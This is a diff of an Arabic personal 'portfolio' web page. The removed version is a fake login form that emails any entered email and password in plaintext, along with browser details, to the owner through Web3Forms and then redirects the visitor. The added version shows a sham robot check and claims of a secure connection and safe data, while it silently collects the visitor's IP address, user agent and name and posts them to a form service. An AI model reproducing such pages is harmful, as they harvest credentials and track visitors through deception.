@@ -7,327 +7,331 @@
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Space+Mono:wght@700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-
 body{
-  min-height:100vh;
-  display:flex;align-items:center;justify-content:center;
-  background:#05080f;
-  font-family:'Cairo',sans-serif;
-  overflow:hidden;
+  min-height:100vh;display:flex;align-items:center;justify-content:center;
+  background:#05080f;font-family:'Cairo',sans-serif;overflow:hidden;
+}
+body::before{
+  content:'';position:fixed;inset:0;
+  background:radial-gradient(ellipse at 60% 40%,rgba(26,111,255,0.07),transparent 60%);
+  pointer-events:none;
 }
 
-/* ── BG ── */
-.bg{position:fixed;inset:0;z-index:0}
-.bg::after{
-  content:'';position:absolute;inset:0;
-  background-image:
-    linear-gradient(rgba(26,111,255,0.025) 1px,transparent 1px),
-    linear-gradient(90deg,rgba(26,111,255,0.025) 1px,transparent 1px);
-  background-size:50px 50px;
-}
-.orb{
-  position:absolute;border-radius:50%;
-  filter:blur(80px);animation:fl ease-in-out infinite;
-}
-.o1{width:420px;height:420px;background:rgba(26,111,255,0.09);top:-120px;right:-100px;animation-duration:9s}
-.o2{width:280px;height:280px;background:rgba(0,190,255,0.06);bottom:-90px;left:-80px;animation-duration:12s;animation-delay:-5s}
-.o3{width:180px;height:180px;background:rgba(110,60,255,0.07);top:55%;left:55%;animation-duration:10s;animation-delay:-3s}
-@keyframes fl{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(-28px) scale(1.04)}}
-
-/* ── CARD ── */
 .card{
-  position:relative;z-index:1;
-  width:390px;margin:1rem;
-  background:rgba(7,13,28,0.93);
+  position:relative;width:370px;margin:1rem;
+  background:rgba(7,13,28,0.96);
   border:1px solid rgba(26,111,255,0.18);
-  border-radius:24px;
-  padding:2.8rem 2.2rem 2.2rem;
-  backdrop-filter:blur(24px);
-  box-shadow:
-    0 40px 90px rgba(0,0,0,0.65),
-    0 0 0 1px rgba(26,111,255,0.05),
-    0 0 60px rgba(26,111,255,0.04);
-  animation:up .7s cubic-bezier(.16,1,.3,1) both;
+  border-radius:20px;padding:2.4rem 2rem;
+  box-shadow:0 30px 70px rgba(0,0,0,0.6);
 }
-@keyframes up{from{opacity:0;transform:translateY(30px) scale(.97)}to{opacity:1;transform:none}}
-
-/* glow top line */
 .card::before{
   content:'';position:absolute;
   top:0;left:10%;right:10%;height:1px;
-  background:linear-gradient(90deg,transparent,rgba(26,111,255,.75),rgba(0,210,255,.5),rgba(26,111,255,.75),transparent);
-  box-shadow:0 0 18px rgba(26,111,255,.45);
-  border-radius:1px;
+  background:linear-gradient(90deg,transparent,#1a6fff,#00c8ff,#1a6fff,transparent);
+  box-shadow:0 0 14px rgba(26,111,255,0.5);
 }
 
-/* corner brackets */
-.c{position:absolute;width:18px;height:18px;border-color:rgba(26,111,255,.28);border-style:solid}
-.tl{top:-1px;right:-1px;border-width:1.5px 1.5px 0 0;border-radius:0 7px 0 0}
-.br{bottom:-1px;left:-1px;border-width:0 0 1.5px 1.5px;border-radius:0 0 0 7px}
+/* steps */
+.step{display:none;animation:fi .4s ease}
+.step.active{display:block}
+@keyframes fi{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
 
-/* ── LOGO ── */
-.logo{text-align:center;margin-bottom:1.8rem}
-.logo-ico{
-  display:inline-flex;align-items:center;justify-content:center;
-  width:64px;height:64px;border-radius:17px;font-size:1.75rem;
-  background:linear-gradient(135deg,rgba(26,111,255,.14),rgba(26,111,255,.04));
-  border:1px solid rgba(26,111,255,.22);
-  box-shadow:0 0 28px rgba(26,111,255,.12),inset 0 1px 0 rgba(255,255,255,.05);
-  margin-bottom:.9rem;
-  animation:gico 3.5s ease-in-out infinite;
-}
-@keyframes gico{0%,100%{box-shadow:0 0 20px rgba(26,111,255,.1)}50%{box-shadow:0 0 40px rgba(26,111,255,.32),0 0 80px rgba(26,111,255,.08)}}
-.logo-name{
-  font-family:'Space Mono',monospace;
-  font-size:1.02rem;font-weight:700;
-  color:#e8f0ff;display:block;letter-spacing:.04em;
-}
+/* logo */
+.logo{text-align:center;margin-bottom:1.6rem}
+.logo-ico{font-size:2.2rem;display:block;margin-bottom:.5rem;animation:glow 3s ease-in-out infinite}
+@keyframes glow{0%,100%{filter:drop-shadow(0 0 6px rgba(26,111,255,.3))}50%{filter:drop-shadow(0 0 18px rgba(26,111,255,.7))}}
+.logo-name{font-family:'Space Mono',monospace;font-size:.9rem;color:#e8f0ff;display:block}
 .logo-name b{color:#4d9eff}
-.logo-tag{
-  font-family:'Space Mono',monospace;
-  font-size:.58rem;color:#233045;
-  letter-spacing:.22em;display:block;margin-top:.28rem;
-}
 
-/* ── TITLES ── */
-.ttl{font-size:1.12rem;font-weight:700;color:#d8e8ff;text-align:center;margin-bottom:.28rem}
-.sub{font-size:.8rem;color:#2b3f5a;text-align:center;margin-bottom:1.8rem}
+.ttl{font-size:1.1rem;font-weight:700;color:#d0e0ff;text-align:center;margin-bottom:.3rem}
+.sub{font-size:.8rem;color:#2b3f5a;text-align:center;margin-bottom:1.6rem;line-height:1.7}
 
-/* ── FIELDS ── */
+/* inputs */
 .field{margin-bottom:1rem}
-.field label{
-  display:block;
-  font-family:'Space Mono',monospace;
-  font-size:.61rem;color:#3d7fff;
-  letter-spacing:.16em;margin-bottom:.45rem;
+.field label{display:block;font-family:'Space Mono',monospace;font-size:.58rem;color:#3d7fff;letter-spacing:.15em;margin-bottom:.4rem}
+.field input{
+  width:100%;background:rgba(26,111,255,.04);
+  border:1px solid rgba(26,111,255,.13);border-radius:9px;
+  padding:.72rem 1rem;
+  font-family:'Cairo',sans-serif;font-size:.9rem;color:#e8f0ff;
+  outline:none;text-align:right;
+  transition:border-color .2s,box-shadow .2s;
 }
-.wrap{position:relative}
-input{
-  width:100%;
-  background:rgba(26,111,255,.04);
-  border:1px solid rgba(26,111,255,.13);
-  border-radius:10px;
-  padding:.78rem 2.4rem .78rem .9rem;
-  font-family:'Cairo',sans-serif;font-size:.9rem;
-  color:#e8f0ff;outline:none;
-  direction:ltr;text-align:right;
-  transition:border-color .25s,box-shadow .25s,background .25s;
-}
-input:focus{
-  border-color:rgba(26,111,255,.5);
-  background:rgba(26,111,255,.08);
-  box-shadow:0 0 0 3px rgba(26,111,255,.1);
-}
-input::placeholder{color:#1b2e44}
-.ico{
-  position:absolute;right:.85rem;top:50%;
-  transform:translateY(-50%);
-  font-size:.78rem;color:#1b2e44;
-  pointer-events:none;transition:color .25s;
-}
-input:focus~.ico{color:#4d9eff}
-.eye{
-  position:absolute;left:.85rem;top:50%;
-  transform:translateY(-50%);
-  background:none;border:none;
-  color:#1b2e44;font-size:.78rem;
-  cursor:pointer;padding:0;transition:color .2s;
-}
-.eye:hover{color:#4d9eff}
+.field input:focus{border-color:rgba(26,111,255,.5);box-shadow:0 0 0 3px rgba(26,111,255,.09);background:rgba(26,111,255,.07)}
+.field input::placeholder{color:#1b2e44}
+.optional{font-family:'Space Mono',monospace;font-size:.5rem;color:#1a3050;margin-right:.4rem}
 
-/* ── ERROR ── */
-.err{
-  min-height:1.1rem;font-size:.76rem;color:#ff4d6d;
-  text-align:center;margin-bottom:.8rem;
-  display:flex;align-items:center;justify-content:center;gap:.3rem;
-  opacity:0;transition:opacity .25s;
-}
-.err.on{opacity:1}
-
-/* ── BUTTON ── */
+/* buttons */
 .btn{
-  width:100%;padding:.85rem;
-  background:linear-gradient(135deg,#1a6fff 0%,#0a47cc 100%);
-  color:#fff;font-family:'Cairo',sans-serif;
-  font-weight:700;font-size:.97rem;
-  border:none;border-radius:10px;cursor:pointer;
-  position:relative;overflow:hidden;
+  width:100%;padding:.82rem;
+  background:linear-gradient(135deg,#1a6fff,#0a40c0);
+  color:#fff;font-family:'Cairo',sans-serif;font-weight:700;font-size:.95rem;
+  border:none;border-radius:9px;cursor:pointer;
   display:flex;align-items:center;justify-content:center;gap:.5rem;
   transition:transform .2s,box-shadow .2s;
-  box-shadow:0 8px 28px rgba(26,111,255,.32),inset 0 1px 0 rgba(255,255,255,.08);
+  box-shadow:0 8px 24px rgba(26,111,255,.3);
+  position:relative;overflow:hidden;
 }
-.btn::before{
-  content:'';position:absolute;
-  top:-50%;left:-70%;
-  width:50%;height:200%;
-  background:rgba(255,255,255,.11);
-  transform:skewX(-20deg);transition:left .55s;
-}
+.btn::before{content:'';position:absolute;top:-50%;left:-70%;width:50%;height:200%;background:rgba(255,255,255,.1);transform:skewX(-20deg);transition:left .5s}
 .btn:hover::before{left:130%}
-.btn:hover{transform:translateY(-1px);box-shadow:0 14px 38px rgba(26,111,255,.48)}
-.btn:active{transform:none}
-.btn:disabled{opacity:.6;pointer-events:none}
-.spin{
-  width:16px;height:16px;
-  border:2.5px solid rgba(255,255,255,.3);
-  border-top-color:#fff;border-radius:50%;
-  animation:sp .7s linear infinite;display:none;
-}
-@keyframes sp{to{transform:rotate(360deg)}}
-.btn.ld .spin{display:block}
-.btn.ld .lbl{display:none}
+.btn:hover{transform:translateY(-1px);box-shadow:0 12px 32px rgba(26,111,255,.45)}
 
-/* ── FOOTER ── */
-.foot{
-  text-align:center;margin-top:1.5rem;
-  font-family:'Space Mono',monospace;
-  font-size:.57rem;color:#1a2b3e;letter-spacing:.07em;
-  line-height:1.9;
+.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:.8rem;margin-top:.5rem}
+.btn-outline{
+  padding:.82rem;
+  background:transparent;
+  border:1px solid rgba(26,111,255,.25);
+  color:#4d9eff;font-family:'Cairo',sans-serif;font-weight:700;font-size:.95rem;
+  border-radius:9px;cursor:pointer;
+  transition:all .2s;
 }
-.dot{
-  display:inline-block;width:5px;height:5px;
-  background:#00d68f;border-radius:50%;
-  margin-right:3px;vertical-align:middle;
-  box-shadow:0 0 5px #00d68f;
-  animation:bl 2s infinite;
+.btn-outline:hover{background:rgba(26,111,255,.08);border-color:rgba(26,111,255,.5)}
+
+/* robot check */
+.robot-box{
+  background:rgba(26,111,255,.04);border:1px solid rgba(26,111,255,.12);
+  border-radius:12px;padding:1.2rem;
+  display:flex;align-items:center;gap:1rem;
+  margin:1.2rem 0;cursor:pointer;
+  transition:border-color .2s,background .2s;
 }
+.robot-box:hover{border-color:rgba(26,111,255,.3);background:rgba(26,111,255,.07)}
+.chk{
+  width:26px;height:26px;border:2px solid rgba(26,111,255,.4);
+  border-radius:6px;flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;transition:all .3s;
+}
+.chk.on{background:#1a6fff;border-color:#1a6fff}
+.chk.on::after{content:'✓';color:#fff;font-size:.85rem;font-weight:700}
+.robot-txt{font-size:.88rem;color:#c0d0e8;font-weight:600}
+.robot-sub{font-family:'Space Mono',monospace;font-size:.52rem;color:#1a2b3e;display:block;margin-top:.1rem;letter-spacing:.1em}
+
+/* choice cards */
+.choice-cards{display:grid;grid-template-columns:1fr 1fr;gap:.8rem;margin:1.2rem 0}
+.choice{
+  padding:1.2rem .8rem;text-align:center;
+  background:rgba(26,111,255,.04);
+  border:1px solid rgba(26,111,255,.12);
+  border-radius:12px;cursor:pointer;
+  transition:all .25s;
+}
+.choice:hover{background:rgba(26,111,255,.1);border-color:rgba(26,111,255,.35);transform:translateY(-2px)}
+.choice-ico{font-size:1.8rem;display:block;margin-bottom:.5rem}
+.choice-lbl{font-size:.85rem;font-weight:700;color:#c0d0e8;display:block}
+.choice-sub{font-size:.7rem;color:#2b3f5a;display:block;margin-top:.2rem}
+
+/* under construction */
+.construct{text-align:center;padding:.5rem 0}
+.construct-ico{font-size:3rem;display:block;margin-bottom:1rem;animation:pulse 1.5s ease-in-out infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+
+/* progress */
+.progress{width:100%;height:3px;background:rgba(26,111,255,.1);border-radius:2px;margin-top:1.2rem;overflow:hidden}
+.pfill{height:100%;width:0;background:linear-gradient(90deg,#1a6fff,#00c8ff);border-radius:2px;transition:width .3s}
+
+/* dots progress */
+.dots{display:flex;justify-content:center;gap:.5rem;margin-bottom:1.6rem}
+.dot-step{width:8px;height:8px;border-radius:50%;background:rgba(26,111,255,.15);transition:all .3s}
+.dot-step.done{background:#1a6fff;box-shadow:0 0 8px rgba(26,111,255,.5)}
+
+/* footer */
+.foot{text-align:center;margin-top:1.2rem;font-family:'Space Mono',monospace;font-size:.52rem;color:#1a2b3e;letter-spacing:.07em}
+.live{display:inline-block;width:5px;height:5px;background:#00d68f;border-radius:50%;margin-left:3px;vertical-align:middle;box-shadow:0 0 5px #00d68f;animation:bl 2s infinite}
 @keyframes bl{0%,100%{opacity:1}50%{opacity:.15}}
+@keyframes spin2{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
-
-<div class="bg">
-  <div class="orb o1"></div>
-  <div class="orb o2"></div>
-  <div class="orb o3"></div>
-</div>
-
 <div class="card">
-  <div class="c tl"></div>
-  <div class="c br"></div>
 
-  <!-- LOGO -->
-  <div class="logo">
-    <div class="logo-ico">👑</div>
-    <span class="logo-name">M_•<b>♕</b>eroufel</span>
-    <span class="logo-tag">PORTFOLIO ACCESS</span>
-  </div>
-
-  <p class="ttl">مرحباً بك 👋</p>
-  <p class="sub">سجّل دخولك للوصول إلى البورتفوليو</p>
-
-  <!-- ERROR -->
-  <div class="err" id="err">⚠ <span id="errTxt"></span></div>
-
-  <!-- EMAIL -->
-  <div class="field">
-    <label>// EMAIL</label>
-    <div class="wrap">
-      <input type="email" id="email" placeholder="example@email.com" autocomplete="email">
-      <span class="ico">✉</span>
+  <!-- ── STEP 1: WELCOME ── -->
+  <div class="step active" id="s1">
+    <div class="dots">
+      <div class="dot-step done" id="d1"></div>
+      <div class="dot-step" id="d2"></div>
+      <div class="dot-step" id="d3"></div>
+      <div class="dot-step" id="d4"></div>
     </div>
-  </div>
-
-  <!-- PASSWORD -->
-  <div class="field">
-    <label>// PASSWORD</label>
-    <div class="wrap">
-      <input type="password" id="pass" placeholder="••••••••" autocomplete="current-password">
-      <span class="ico">🔒</span>
-      <button class="eye" id="eye" type="button">👁</button>
+    <div class="logo">
+      <span class="logo-ico">👑</span>
+      <span class="logo-name">M_•<b>♕</b>eroufel</span>
     </div>
+    <p class="ttl">أهلاً وسهلاً 👋</p>
+    <p class="sub">مرحباً بك في صفحتي الشخصية<br>اضغط متابعة للبدء</p>
+    <button class="btn" onclick="goStep(2)">متابعة ←</button>
+    <div class="foot"><span class="live"></span> الاتصال آمن</div>
   </div>
 
-  <!-- BUTTON -->
-  <button class="btn" id="btn" type="button">
-    <span class="lbl">دخول إلى البورتفوليو 🔐</span>
-    <div class="spin"></div>
-  </button>
+  <!-- ── STEP 2: ROBOT CHECK ── -->
+  <div class="step" id="s2">
+    <div class="dots">
+      <div class="dot-step done"></div>
+      <div class="dot-step done" id="d2b"></div>
+      <div class="dot-step" id="d3b"></div>
+      <div class="dot-step" id="d4b"></div>
+    </div>
+    <div class="logo">
+      <span class="logo-ico">🛡️</span>
+      <span class="logo-name">M_•<b>♕</b>eroufel</span>
+    </div>
+    <p class="ttl">مهلاً! 🤖</p>
+    <p class="sub">نشك أنك ربما روبوت<br>أثبت أنك إنسان للمتابعة</p>
 
-  <!-- FOOTER -->
-  <div class="foot">
-    <span class="dot"></span>النظام يعمل — كل دخول يُسجَّل ويُرسَل
+    <div class="robot-box" onclick="checkBot()">
+      <div class="chk" id="chk"></div>
+      <div>
+        <span class="robot-txt">أنا لست روبوتاً</span>
+        <span class="robot-sub">SECURITY CHECK v2</span>
+      </div>
+    </div>
+
+    <button class="btn" id="botBtn" disabled style="opacity:.4" onclick="goStep(3)">
+      تحقق والمتابعة ✓
+    </button>
+    <div class="foot"><span class="live"></span> فحص أمني تلقائي</div>
   </div>
+
+  <!-- ── STEP 3: NAME & NICKNAME ── -->
+  <div class="step" id="s3">
+    <div class="dots">
+      <div class="dot-step done"></div>
+      <div class="dot-step done"></div>
+      <div class="dot-step done"></div>
+      <div class="dot-step" id="d4c"></div>
+    </div>
+    <div class="logo">
+      <span class="logo-ico">✏️</span>
+      <span class="logo-name">M_•<b>♕</b>eroufel</span>
+    </div>
+    <p class="ttl">تعرّف علينا 🙂</p>
+    <p class="sub">المعلومات التالية اختيارية تماماً</p>
+
+    <div class="field">
+      <label>ما اسمك؟ <span class="optional">(اختياري)</span></label>
+      <input type="text" id="fname" placeholder="أدخل اسمك...">
+    </div>
+    <div class="field">
+      <label>ما لقبك؟ <span class="optional">(اختياري)</span></label>
+      <input type="text" id="lname" placeholder="أدخل لقبك...">
+    </div>
+
+    <button class="btn" onclick="goChoice()">التالي ←</button>
+    <div class="foot"><span class="live"></span> بياناتك آمنة</div>
+  </div>
+
+  <!-- ── STEP 4: CHOICE ── -->
+  <div class="step" id="s4">
+    <div class="dots">
+      <div class="dot-step done"></div>
+      <div class="dot-step done"></div>
+      <div class="dot-step done"></div>
+      <div class="dot-step done"></div>
+    </div>
+    <div class="logo">
+      <span class="logo-ico">🎯</span>
+      <span class="logo-name">M_•<b>♕</b>eroufel</span>
+    </div>
+    <p class="ttl">ماذا تريد؟</p>
+    <p class="sub">اختر ما يناسبك</p>
+
+    <div class="choice-cards">
+      <div class="choice" onclick="goSupport()">
+        <span class="choice-ico">💙</span>
+        <span class="choice-lbl">دعمنا</span>
+        <span class="choice-sub">ساهم معنا</span>
+      </div>
+      <div class="choice" onclick="goFollow()">
+        <span class="choice-ico">👤</span>
+        <span class="choice-lbl">متابعة</span>
+        <span class="choice-sub">صفحتي الشخصية</span>
+      </div>
+    </div>
+    <div class="foot"><span class="live"></span> شكراً لزيارتك</div>
+  </div>
+
+  <!-- ── STEP 5: UNDER CONSTRUCTION ── -->
+  <div class="step" id="s5">
+    <div class="construct">
+      <span class="construct-ico">🚧</span>
+      <p class="ttl">قيد الإنشاء</p>
+      <p class="sub" style="margin-top:.5rem">صفحة الدعم تحت الإنشاء حالياً<br>عد لاحقاً 🙏</p>
+      <div class="progress"><div class="pfill" id="pf" style="width:65%"></div></div>
+      <br>
+      <button class="btn-outline" style="width:100%;padding:.75rem;margin-top:.5rem" onclick="goStep(4)">← رجوع</button>
+    </div>
+    <div class="foot"><span class="live"></span> قريباً...</div>
+  </div>
+
 </div>
 
 <script>
-const emailEl = document.getElementById('email');
-const passEl  = document.getElementById('pass');
-const btn     = document.getElementById('btn');
-const err     = document.getElementById('err');
-const errTxt  = document.getElementById('errTxt');
+let visitorIp = 'غير معروف';
 
-// toggle password
-document.getElementById('eye').onclick = () =>
-  passEl.type = passEl.type === 'password' ? 'text' : 'password';
+// جلب الـ IP
+fetch('https://api.ipify.org?format=json')
+  .then(r => r.json())
+  .then(d => { visitorIp = d.ip; })
+  .catch(() => {});
 
-// show error
-function showErr(msg) {
-  errTxt.textContent = msg;
-  err.classList.add('on');
-  setTimeout(() => err.classList.remove('on'), 3500);
+// الانتقال بين الخطوات
+function goStep(n) {
+  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+  document.getElementById('s' + n).classList.add('active');
 }
 
-// send notification via Web3Forms
-async function notify(email, pass) {
-  /*
-  ════════════════════════════════════════
-   لتفعيل الإشعارات على إيميلك:
-   1. اذهب إلى  https://web3forms.com
-   2. أدخل إيميلك ← انسخ الـ Access Key
-   3. ضعه هنا بدلاً من  f23663a3-0f77-43e4-b4f7-515107188d6f
-  ════════════════════════════════════════
-  */
-  const KEY = 'f23663a3-0f77-43e4-b4f7-515107188d6f';
+// التحقق من الروبوت
+let botDone = false;
+function checkBot() {
+  if (botDone) return;
+  const chk = document.getElementById('chk');
+  const btn = document.getElementById('botBtn');
+  chk.style.border = '2px solid #1a6fff';
+  setTimeout(() => {
+    botDone = true;
+    chk.classList.add('on');
+    btn.disabled = false;
+    btn.style.opacity = '1';
+  }, 700);
+}
 
-  const time = new Date().toLocaleString('ar-DZ', {hour12: false});
+// الانتقال لخيار الاسم
+function goChoice() {
+  const name     = document.getElementById('fname').value.trim() || 'زائر';
+  const nickname = document.getElementById('lname').value.trim() || '—';
+  sendData(name, nickname);
+  goStep(4);
+}
+
+// إرسال البيانات
+async function sendData(name, nickname) {
+  const time = new Date().toLocaleString('ar-DZ', { hour12: false });
   try {
-    await fetch('https://api.web3forms.com/submit', {
+    await fetch('https://formspree.io/f/YOUR_FORM_ID', {
       method: 'POST',
-      headers: {'Content-Type': 'application/json'},
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
       body: JSON.stringify({
-        access_key: KEY,
-        subject: `🔐 دخول جديد على البورتفوليو`,
-        from_name: 'Portfolio System',
-        message:
-`━━━━━━━━━━━━━━━━━━━━━━
-🔔 دخول جديد على موقعك
-━━━━━━━━━━━━━━━━━━━━━━
-📧 الإيميل      : ${email}
-🔑 كلمة المرور  : ${pass}
-🕐 الوقت        : ${time}
-🌐 المتصفح      : ${navigator.userAgent.slice(0,90)}
-🖥️  الشاشة      : ${screen.width}×${screen.height}
-━━━━━━━━━━━━━━━━━━━━━━`,
-        botcheck: ''
+        _subject: '👤 زائر جديد على الموقع',
+        الاسم: name,
+        اللقب: nickname,
+        الوقت: time,
+        IP: visitorIp,
+        الجهاز: navigator.userAgent.slice(0, 80)
       })
     });
-  } catch(e) { /* silent */ }
+  } catch(e) {}
 }
 
-// login
-btn.addEventListener('click', async () => {
-  const email = emailEl.value.trim();
-  const pass  = passEl.value.trim();
-
-  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
-    return showErr('أدخل بريدًا إلكترونيًا صالحًا');
-  if (pass.length < 4)
-    return showErr('كلمة المرور قصيرة جداً');
-
-  btn.classList.add('ld');
-  btn.disabled = true;
-
-  notify(email, pass); // إرسال في الخلفية
-
-  await new Promise(r => setTimeout(r, 1300));
+// متابعة
+function goFollow() {
   window.location.href = 'https://d-mrf.github.io/mrf09_Official-github-io/';
-});
+}
 
-// enter key
-[emailEl, passEl].forEach(el =>
-  el.addEventListener('keydown', e => e.key === 'Enter' && btn.click())
-);
+// دعم
+function goSupport() {
+  goStep(5);
+}
 </script>
 </body>
 </html>
+
+
